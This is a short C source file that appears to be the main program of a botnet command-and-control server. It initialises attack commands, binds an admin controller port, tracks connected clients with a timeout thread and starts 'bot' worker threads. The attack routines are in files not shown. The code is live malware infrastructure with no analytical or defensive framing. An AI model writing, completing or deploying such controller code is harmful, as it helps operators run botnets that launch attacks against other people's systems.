#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <mysql/mysql.h>

#include "command.h"
#include "client.h"
#include "worker.h"
#include "util.h"
#include "admin.h"

void *main_timeout(void *arg)
{
    while(1)
    {
        int i = 0;

        for (i = 0; i < CLIENT_MAXFDS; i++)
        {
            if (clients[i].timeout <= time(NULL) && clients[i].connected == 1)
            {
                worker_cleanup_connection(&clients[i]);
            }
        }

        sleep(1);
    }
}

int main()
{
    pthread_t admin_thread, timeout_thread;
    char sendbuf[512];
    int i, length = 0;

    if (mysql_library_init(0, NULL, NULL))
    {
#ifdef DEBUG
        printf("[admin] failed to initlize mysql libary\n");
#endif
        return 0;
    }

    command_attacks_init();
    command_args_init();

    if ((i = admin_create_and_bind(CLIENT_ADMIN_PORT)) == -1)
    {
#ifdef DEBUG
        printf("[main] failed to bind controller\n");
#endif
        exit(0);
    }

    pthread_create(&admin_thread, NULL, &admin_listen, &i);
    pthread_create(&timeout_thread, NULL, &main_timeout, NULL);
    worker_init(CLIENT_BOT_WORKERS);

    while (1)
    {
        sleep(10);
    }

    mysql_library_end();
    return 1;
}
